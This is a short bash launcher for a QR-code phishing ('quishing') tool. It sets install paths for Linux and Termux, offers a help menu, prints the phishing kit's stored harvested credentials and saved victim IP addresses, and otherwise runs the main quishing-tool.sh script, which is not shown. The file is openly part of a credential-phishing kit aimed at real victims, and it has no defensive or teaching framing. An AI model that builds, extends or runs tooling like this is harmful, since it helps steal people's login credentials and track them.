#!/bin/bash

# Quishing Tool CLI Interface
# GitHub: Your project's GitHub link

# Check if the system is Android (for Termux support)
if [[ $(uname -o) == *'Android'* ]]; then
	QUISHING_ROOT="/data/data/com.termux/files/usr/opt/quishing-tool"
else
	QUISHING_ROOT="/opt/quishing-tool"
fi

# Display help menu if '-h' or 'help' argument is passed
if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "Usage: quishing-tool [OPTION]"
	echo
	echo "Options:"
	echo " -h | help : Show this help menu & Exit"
	echo " -c | auth : View saved credentials"
	echo " -i | ip   : View saved victim IPs"
	echo "            : You can run \`quishing-tool\` directly to start the tool."
	echo
	exit 0

# View saved credentials
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	if [[ -f "$QUISHING_ROOT/auth/usernames.dat" ]]; then
		echo -e "\n[+] Showing saved credentials:\n"
		cat "$QUISHING_ROOT/auth/usernames.dat"
	else
		echo "[!] No credentials found!"
	fi

# View saved victim IPs
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	if [[ -f "$QUISHING_ROOT/auth/ip.txt" ]]; then
		echo -e "\n[+] Showing saved victim IPs:\n"
		cat "$QUISHING_ROOT/auth/ip.txt"
	else
		echo "[!] No saved IPs found!"
	fi

# Default behavior: run quishing-tool
else
	if [[ -d "$QUISHING_ROOT" ]]; then
		cd "$QUISHING_ROOT"
		bash ./quishing-tool.sh
	else
		echo "[!] Error: Quishing-tool directory not found!"
		exit 1
	fi
fi
